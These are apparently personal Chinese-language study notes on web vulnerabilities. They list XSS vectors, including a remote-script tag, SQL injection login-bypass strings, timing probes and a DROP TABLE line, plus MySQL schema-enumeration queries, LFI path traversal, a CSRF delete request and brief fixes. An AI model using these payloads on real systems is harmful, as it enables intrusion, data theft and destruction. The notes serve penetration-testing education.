
## 分析工具:
`burpsuite` 抓包 改包

`nmap ncat` 掃port 測port

`whois` and `theharvester` OSINT

`python` 不用多說

`sqlmap` 不用多說

還有瀏覽器的 `F12(Developer tools)` (超級有用!)
### #別當 script kiddy!!


## 常見漏洞

### XSS(Cross Site Scripting)

#### Attacking Vectors
##### 基本
`<script src = www.example.com/xss.js></script>`
 
 or
 
 `<script>alert(1)</script>`
##### Advanced Vector
`<a id=x tabindex=1 onactivate=alert(1)></a>`

`<body onafterprint=alert(1)>`

`<a id=x tabindex=1 onbeforeactivate=alert(1)></a>`

`<audio src/onerror=alert(1)>`

`<body onpageshow=alert(1)>`

`<body onresize=alert(1)`

and more on [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

#### Fixing
escape html字元

### SQL 注入

#### Attacking Vectors
##### 檢查是否有漏洞
Common vectors like

`'` and `ORDER BY 1`

Blind-Injections to check without debug info

`' AND 1=1 ` (true) `' AND 1=2 ` (false)

Timing attack

`BENCHMARK(878787878787, ('hey', 'you'))`

##### 註解掉後面的query
`DROP TABLE1; --`

or

`DROP TABLE1; #`
##### Login bypass
用 `'` 和 `--` 來閉合引號和註解

##### 萬用密碼
`admin 'or'1'='1`

`admin '--`

`admin '/*`

`ad'||'min'/*`

##### Common Vectors(MySQL for example)
`SELECT user();`

`SELECT user FROM mysql.user;`

`SELECT distinct(db) FROM mysql.db `

`SELECT schema_name FROM information_schema.schemata; (for MySQL >= v5.0)`

`SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`

`SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`

`SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’`

##### !No `information_schema` in MySQL < 5!

#### Fixing
預編譯SQL語句

### PHP-Include (上傳漏洞)
PHP 的 include(), require(), include_once(), require_once()可供利用

#### Attacking Vectors
##### file_put_contents寫入
直接

`file_put_contents('path', content')`

##### php偽協議
`data:text/html;ascii, ........`

也可以base64

##### 本地包含(LFI)
透過改包，可以讀取檔案

##### 其他
`../../`上層目錄

用編碼繞防火牆

POST Data 也可以注入payload

### CSRF (Cross-Site-Request-Forgery)
#### Attacking Vectors
將siteB的元素注入到siteA:

`<img src = http://www.siteb.com/blog.php?action=delete></img>`

#### Fixing
檢查referer

captcha

csrf token(保存在server的session裡面，隨機產生)

### SSRF (Server-Side-Request-Forgery)
很像csrf，但是用來訪問內網的server

使用 `php` 偽協議 `RFI` 之類的方式實現


### ClickJacking

插一個透明的frame，直接設定成網頁大小，無論如何使用者都會點擊到frame的內容
